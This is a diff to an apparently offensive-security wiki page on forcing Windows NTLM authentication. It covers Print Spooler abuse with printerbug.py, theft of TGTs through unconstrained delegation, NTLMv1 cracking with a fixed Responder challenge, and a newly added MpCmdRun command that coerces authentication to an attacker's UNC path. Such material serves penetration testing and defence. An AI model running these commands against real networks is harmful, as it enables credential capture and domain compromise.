@@ -1,4 +1,6 @@
-# Printers Spooler Service abuse
+# Force NTLM Privileged Authentication
+
+## Spooler Service Abuse
 
 If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.  
 Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.
@@ -43,15 +45,20 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 ### Combining with Unconstrained Delegation
 
-If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it \([Pass the Ticket](pass-the-ticket.md)\). 
+If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it \([Pass the Ticket](pass-the-ticket.md)\).
 
-### NTLMv1 attack
+## Inside Windows
 
-Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.
+If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:
 
-You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 112233445566778899**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.  
-If you are using `responder` you could try to **use the flag `--lm`** to try to **downgrade** the **authentication**.  
-_Note that for this technique the authentication must be performed using NTLMv1 \(NTLMv2 is not valid\)._
+### Defender MpCmdRun
 
-Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** \([more info here](../ntlm/#ntlmv1-challenge)\), so using some services specially dedicated to cracking DES you will be able to crack it \(you could use [https://crack.sh/](https://crack.sh/) for example\).
+```bash
+C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
+```
+
+## Cracking NTLMv1
+
+If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).  
+_Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
 
